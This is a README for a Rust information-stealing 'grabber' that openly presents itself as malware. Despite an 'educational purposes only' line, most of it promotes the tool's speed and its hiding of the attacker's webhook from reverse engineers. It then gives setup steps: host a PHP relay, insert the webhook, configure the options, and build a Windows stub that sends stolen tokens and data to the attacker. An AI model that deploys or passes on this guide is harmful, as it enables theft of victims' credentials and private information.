### Note

### Educational purposes only
Don't use this project maliciously. 

### How it works
This is a malware written in Rust that steals the information the attacker chooses to steal and sends that through a server to the attacker's webhook.

### Info
This is a lot faster than other grabbers due to not using regex to find tokens and due to rust being a faster language overall. This grabber also keeps your webhook secure from any reverse engineers preventing it from being deleted.

### Setup
1. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
2. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php#L3) and set the webhook
3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) which has your webhook to your webhost's `public_html` folder
4. Configure the options in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs) however you like
5. Make sure your [webhost](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) has `/upload.php` at the end
5. Run `cargo build --release --target=x86_64-pc-windows-msvc`
6. The stub will be in `/target/x86_64-pc-windows-msvc/release`
